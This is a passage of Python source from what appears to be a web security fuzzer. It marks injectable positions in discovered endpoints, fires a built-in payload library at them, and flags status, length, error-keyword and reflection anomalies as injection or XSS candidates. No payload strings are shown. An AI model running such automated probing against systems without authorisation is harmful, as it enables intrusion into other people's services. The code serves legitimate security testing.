    body_snippet: str = ""

    def to_dict(self) -> dict:
        return {
            "method": self.method,
            "url": self.url,
            "position": self.position,
            "payload": self.payload,
            "baseline_status": self.baseline_status,
            "fuzz_status": self.fuzz_status,
            "baseline_length": self.baseline_length,
            "fuzz_length": self.fuzz_length,
            "anomaly": self.anomaly,
            "body_snippet": self.body_snippet[:300],
        }


@dataclass
class AutoFuzzResult:
    endpoints_fuzzed: int = 0
    requests_sent: int = 0
    findings: list[FuzzFinding] = field(default_factory=list)

    def to_dict(self) -> dict:
        return {
            "endpoints_fuzzed": self.endpoints_fuzzed,
            "requests_sent": self.requests_sent,
            "findings": [f.to_dict() for f in self.findings],
        }


async def auto_fuzz_findings(
    findings,                   # list[Finding] from classifier
    auth_headers: dict = None,
    timeout: float = 10.0,
    max_endpoints: int = 20,
    concurrency: int = 8,
) -> AutoFuzzResult:
    """
    For each high-interest classified finding, auto-place §markers§ on
    injectable positions (URL path IDs, query params, JSON body fields)
    and run the Intruder's payload library in sniper mode.

    Anomalies are flagged when:
      - The HTTP status differs from the baseline
      - The response length changes by >30%
      - The body contains error keywords (SQL errors, stack traces, etc.)
      - The payload is reflected verbatim in the response (XSS candidate)
    """
    from intruder import Intruder, IntruderRequest, BUILTIN_PAYLOADS

    result = AutoFuzzResult()
    auth = auth_headers or {}

    # Deduplicate and pick candidates
    seen: set[str] = set()
    candidates = []
    for f in sorted(findings, key=lambda x: -getattr(x, "score", 0)):
        key = f"{f.method}:{f.url}"
        if key in seen:
            continue
        seen.add(key)
        candidates.append(f)
        if len(candidates) >= max_endpoints:
            break

    if not candidates:
        return result

    intruder = Intruder(timeout=timeout, concurrency=concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True,
        timeout=timeout, headers=auth,
    ) as client:
        tasks = [
            _fuzz_one(client, intruder, f, auth, BUILTIN_PAYLOADS, result)
            for f in candidates
        ]
        await asyncio.gather(*tasks, return_exceptions=True)

    return result


async def _fuzz_one(client, intruder, finding, auth, builtin_payloads, result: AutoFuzzResult) -> None:
    from intruder import IntruderRequest

    ireq = _mark_request(finding, auth)
    if ireq is None:
        return

    # Count marker pairs — if none, skip
    all_text = ireq.url + (ireq.body or "") + " ".join(ireq.headers.values())
    n_positions = all_text.count("§") // 2
    if n_positions == 0:
        return

    payload_names, max_per = _pick_payload_sets(finding)
    payload_list: list[str] = []
    for name in payload_names:
        pl = builtin_payloads.get(name, [])
        payload_list.extend(pl[:max_per])

    if not payload_list:
        return

    # Baseline: send with original values (no markers → defaults)
    baseline_status, baseline_len, baseline_body = await _baseline(client, finding)
    if baseline_status is None:
        return

    result.endpoints_fuzzed += 1

    fuzz_result = await intruder.run(
        ireq,
        [payload_list],
        mode="sniper",
        verbose=False,
    )
    result.requests_sent += fuzz_result.total_sent

    # Analyse each attack result for anomalies
    for ar in fuzz_result.results:
        if ar.error:
            continue
        payload = ar.payloads[0] if ar.payloads else ""
        anomaly = _classify_anomaly(
            ar.status, ar.length, ar.body_snippet,
            baseline_status, baseline_len,
            payload,
        )
        if anomaly:
            result.findings.append(FuzzFinding(
                method=finding.method,
                url=finding.url,
                position=_extract_position_label(ireq, ar.num, fuzz_result.total_sent // max(n_positions, 1)),
                payload=payload,
                baseline_status=baseline_status,
                fuzz_status=ar.status,
                baseline_length=baseline_len,
                fuzz_length=ar.length,
                anomaly=anomaly,
                body_snippet=ar.body_snippet,
            ))


def _mark_request(finding, auth: dict):
    """Build IntruderRequest with §markers§ on all injectable positions."""
    from intruder import IntruderRequest

    url = finding.url
    body = getattr(finding, "body", None) or ""
    headers = {k: v for k, v in (getattr(finding, "headers", None) or {}).items()
               if k.lower() not in ("host", "content-length")}
    headers.update({k: v for k, v in auth.items()
                    if k.lower() not in ("host", "content-length")})

    parsed = urlparse(url)

    # Mark URL path IDs
    marked_path = _PATH_INJECT_RE.sub(lambda m: f"{m.group(1)}§{m.group(2)}§", parsed.path)

    # Mark all query params — build manually to avoid §-encoding
    params = parse_qs(parsed.query)
    if params:
        marked_qs = "&".join(f"{k}=§{v[0]}§" for k, v in params.items())
    else:
        marked_qs = parsed.query

    marked_url = parsed._replace(path=marked_path, query=marked_qs).geturl()

    # Mark JSON body fields (shallow — depth 1)
    marked_body = None
    if body:
        try:
            bd = json.loads(body)
            if isinstance(bd, dict):
                marked_bd = {
                    k: f"§{v}§" if isinstance(v, (str, int, float, bool)) and v is not None
                    else v
                    for k, v in bd.items()
                }
                marked_body = json.dumps(marked_bd, ensure_ascii=False)
        except (json.JSONDecodeError, ValueError):
            pass

    # Require at least one marker somewhere
    total = (marked_url + (marked_body or "")).count("§") // 2
    if total == 0:
        return None

    return IntruderRequest(
        method=finding.method,
        url=marked_url,
        headers=headers,
        body=marked_body,
    )


def _pick_payload_sets(finding) -> tuple[list[str], int]:
    cats = set(getattr(finding, "categories", []))
    for cat, (names, cap) in _CAT_PAYLOADS.items():
        if cat in cats:
            return names, cap
    return _DEFAULT_PAYLOADS


async def _baseline(client, finding) -> tuple[Optional[int], int, str]:
    try:
        body = getattr(finding, "body", None)
        resp = await client.request(
            finding.method, finding.url,
            content=body.encode() if body else None,
        )
        return resp.status_code, len(resp.content), resp.text[:500]
    except Exception:
        return None, 0, ""


def _classify_anomaly(
    status: int, length: int, body: str,
    baseline_status: int, baseline_len: int,
    payload: str,
) -> Optional[str]:
    reasons = []

    if status != baseline_status:
        reasons.append(f"status {baseline_status}→{status}")

    if baseline_len > 50:
        delta = abs(length - baseline_len) / baseline_len
        if delta > 0.30:
            reasons.append(f"length {baseline_len}→{length} ({delta:.0%} change)")

    if _FUZZ_ERROR_RE.search(body):
        m = _FUZZ_ERROR_RE.search(body)
        reasons.append(f"error keyword: {m.group(0)!r}")

    # Payload reflection (XSS candidate) — only for non-trivial payloads
    if len(payload) > 3 and payload in body:
        reasons.append("payload reflected in response")

    return "; ".join(reasons) if reasons else None


def _extract_position_label(ireq, attack_num: int, attacks_per_pos: int) -> str:
    """Best-effort: infer which marker position this attack targeted."""
    if attacks_per_pos <= 0:
        return "?"
    pos_index = (attack_num - 1) // max(attacks_per_pos, 1)
    # Extract position labels from markers in order
    all_text = ireq.url + (ireq.body or "")
    positions = re.findall(r"§([^§]*)§", all_text)
    if pos_index < len(positions):
        return f"§{positions[pos_index]}§"
    return f"position {pos_index}"
